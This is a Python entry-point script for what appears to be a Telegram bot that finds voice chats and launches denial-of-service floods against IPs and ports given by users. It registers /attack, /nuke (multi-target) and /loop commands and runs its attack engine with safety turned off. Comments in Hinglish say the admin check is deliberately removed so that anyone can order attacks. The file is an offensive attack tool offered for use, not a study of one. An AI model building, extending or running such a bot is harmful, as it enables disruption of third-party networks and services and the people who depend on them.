from __future__ import annotations
import asyncio, logging, sys
from pyrogram import Client, idle, filters
from pyrogram.handlers import MessageHandler
from config import Config
from attack_engine import AttackEngine
from vc_detector import VCDetector
from bot_handler import BotHandler

logging.basicConfig(level=logging.INFO, format="%(asctime)s %(message)s", handlers=[logging.StreamHandler()])
LOGGER = logging.getLogger(__name__)

# ✅ SABSE PEHLE YEH COMMAND REGISTER HO - KOI ADMIN CHECK NAHI
async def force_start(client, msg):
    await msg.reply("✅ BOT ACTIVE!\n\nCommands:\n/scan - Scan VCs\n/attack <ip> <port> <duration> - Attack IP\n/nuke <ip:port> <ip:port> <duration> - Multi target\n/loop <ip> <port> <duration> <iterations> - Loop attack\n/stop - Stop all\n/status - Stats")

async def amain():
    cfg = Config.from_env()
    bot = Client("vc_bot", api_id=cfg.api_id, api_hash=cfg.api_hash, bot_token=cfg.bot_token)
    user = Client("vc_user", api_id=cfg.api_id, api_hash=cfg.api_hash, session_string=cfg.session_string)
    engine = AttackEngine(threads=cfg.max_threads, max_dur=cfg.max_duration, safety=False)
    
    await bot.start()
    await user.start()
    
    # ✅ FORCE START - Koi admin check nahi, sabko allow
    bot.add_handler(MessageHandler(force_start, filters.command("start")))
    
    detector = VCDetector(user, cooldown=cfg.scan_cooldown)
    # admin_id = None means koi admin check nahi
    handler = BotHandler(bot, detector, engine, None, cfg.max_duration, cfg.scan_limit)
    
    LOGGER.info("✅ ONLINE – commands: /scan, /attack, /nuke, /loop, /stop, /status")
    await idle()
    engine.stop()
    await user.stop()
    await bot.stop()

def main():
    try:
        asyncio.run(amain())
    except KeyboardInterrupt:
        pass
    except Exception as e:
        LOGGER.error(f"Fatal: {e}")

if __name__ == "__main__":
    main()
